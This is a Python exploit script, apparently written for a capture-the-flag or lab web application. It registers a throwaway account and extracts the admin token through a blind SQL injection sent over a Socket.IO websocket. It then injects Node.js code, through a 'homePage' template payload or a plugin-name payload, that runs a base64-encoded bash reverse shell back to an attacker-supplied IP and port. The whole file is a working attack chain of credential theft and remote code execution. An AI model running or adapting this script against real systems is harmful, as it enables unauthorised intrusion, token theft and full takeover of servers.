import websocket
import json
import threading
import time
import requests
import argparse
import base64
import random

parser = argparse.ArgumentParser()
parser.add_argument('-u','--url', help='Target url', required=True)
parser.add_argument('-li','--lip', help='local ip', required=True)
parser.add_argument('-lp','--lport', help='local port', required=True)
parser.add_argument('-s','--srce', help='Rce using standard http channel', action=argparse.BooleanOptionalAction)

args = parser.parse_args()

proxies = {"http": "127.0.0.1:8080","https":"127.0.0.1:8080"}

# Event to control the message flow
message_received_event = threading.Event()

# Global variable to store the received message
received_message = ""
a = None 
extracted_message = ""
finished_extraction = False

def register_account():
    r1 = random.randint(100, 1000)
    email = "test" + str(r1) + "@test.com"
    password = "test"

    data = {
        "firstName": "test",
        "lastName" : "test",
        "email": email,
        "password1":password,
        "password2":password
    }

    url = "{}/register".format(args.url)
    r = requests.post(url, json=data, proxies=proxies, allow_redirects=False)

    if r.status_code == 302:
        return email, password
    else: 
        print("registration went wrong")
        exit()

def login_get_token():
    email, password = register_account()

    login_data = {
        "email": email, 
        "password": password
    }
    print("Login in...")
    url = "{}/login".format(args.url)
    r = requests.post(url, json=login_data, proxies=proxies, allow_redirects=False)

    if r.status_code == 302: 
        return r.cookies["auth_token"]
    else: 
        print("Could not login")
        exit()

def parse_message(event, jsonobject):
    return '42["{0}",{1}]'.format(event, str(jsonobject))

def alterantive_websocket_rce(ws, token):
    rce = "/bin/bash -i >& /dev/tcp/{}/{} 0>&1".format(args.lip, args.lport)
    rce_base64 = base64.b64encode(rce.encode('utf-8'))
    rce_clean = rce_base64.decode('utf-8')

    cmd = "chat_trad.js')];function test(){localLoad=global.process.mainModule.constructor._load;s='child';p='process';pwd=s+'_'+p;sh=localLoad(pwd).exec('echo %s | base64 -d | bash')};test()//" % rce_clean

    json_object = {
            "token": token,
            "name": cmd,
            "enable": "true"
        }

    message = parse_message("togglePlugin",str(json.dumps(json_object)))
    
    print("sending rce payload via websocket...")
    ws.send(message)
    print("check listener")

def run_rce(token):
    rce = "/bin/bash -i >& /dev/tcp/{}/{} 0>&1".format(args.lip, args.lport)
    rce_base64 = base64.b64encode(rce.encode('utf-8'))
    rce_clean = rce_base64.decode('utf-8')
    payload = "#{function(){localLoad=global.process.mainModule.constructor._load;s='child';p='process';pwd=s+'_'+p;sh=localLoad(pwd).exec('echo %s|base64 -d|bash')}()}" % rce_clean
    data_json = {
        "homePage": payload
    }
    url = "{}/server".format(args.url)

    cookies = {
        "auth_token": token
    }

    print("running rce - check_listener")
    r = requests.post(url, json=data_json, proxies=proxies, cookies=cookies)
    r2 = requests.get(args.url)
    print("check listener")

def on_open(ws):
    print("Waiting for the token extractor to finish")
    

# Callback for when a message is received from the server
def on_message(ws, message):
    global received_message, a, extracted_message
    
    # Store the raw message in the variable for later use
    received_message = message

    if message.startswith('42') and "true" in message:
        try:
            extracted_message += a
            print(extracted_message)
        except json.JSONDecodeError as e:
            print(f"Error parsing JSON: {e}")
    if len(extracted_message) == 32 and args.srce: 
        run_rce(extracted_message)
        exit()
    elif len(extracted_message) == 32: 
        alterantive_websocket_rce(ws ,extracted_message)
        exit()
    
    message_received_event.set()

def on_close(ws, close_status_code, close_msg):
    print(f"Connection closed. Status: {close_status_code}, Message: {close_msg}")

def on_error(ws, error):
    print(f"Error encountered: {error}")

# Function to send messages in sequence, waiting for a response before sending the next
def send_messages(ws, token):
    global a, finished_extraction
    
    charset = "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "1234567890"
    print ("Extracting the admin token...")

    for i in range(1,33):
        for char in charset: 
            # Wait for the previous message to be processed
            message_received_event.wait()
            # Reset the event before sending the next message
            message_received_event.clear()

            payload = """chujostwo' or (select substring(token,{},1) COLLATE utf8mb4_bin from AuthTokens where id = 1) = char({})#""".format(i,ord(char))
            a = char
            message = f'42["checkEmail",{{"token":"{token}","email":"{payload}"}}]'
            ws.send(message)
            #time.sleep(0.1)
    
# WebSocket client setup
def main(token, host):
    host = host.replace("http://", "")
    ws_url = "ws://{}/socket.io/?EIO=4&transport=websocket".format(host) 
    
    # Initialize the WebSocket connection
    ws = websocket.WebSocketApp(
        ws_url,
        on_open=on_open,
        on_message=on_message,
        on_close=on_close,
        on_error=on_error
    )
    
    # Start a thread to send messages in sequence
    threading.Thread(target=send_messages, args=(ws,token)).start()
    ws.run_forever()

if __name__ == '__main__':
    token = login_get_token()
    main(token,args.url)